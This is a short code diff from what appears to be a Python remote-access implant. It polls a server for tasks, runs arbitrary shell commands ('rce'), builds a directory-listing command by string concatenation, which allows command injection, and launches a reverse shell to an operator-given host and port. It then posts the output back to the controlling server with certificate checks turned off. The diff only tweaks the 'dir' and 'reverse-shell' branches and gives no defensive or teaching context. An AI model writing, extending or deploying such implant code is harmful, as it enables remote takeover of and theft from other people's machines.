@@ -37,10 +37,10 @@ while True:
             if task["type"] == "rce":
                 data["output"] = sp.getoutput(task["args"][0])
             elif task["type"] == "dir":
-                data["output"] = sp.getoutput("ls" + task["args"][0])
-            elif task["type"] == "reverse-shell":
-                data["output"] = "" 
+                data["output"] = sp.getoutput("ls " + task["args"][0])
+            elif task["type"] == "reverse-shell": 
                 threading.Thread(target=reverse_shell, kwargs={"host":task['args'][0], "port":task['args'][1], "binary": task['args'][2]}).start()
+                data["output"] = "Send reverse shell"
             res = r.post(URL + "/finish/" + name, json=data, verify=False)
 
             
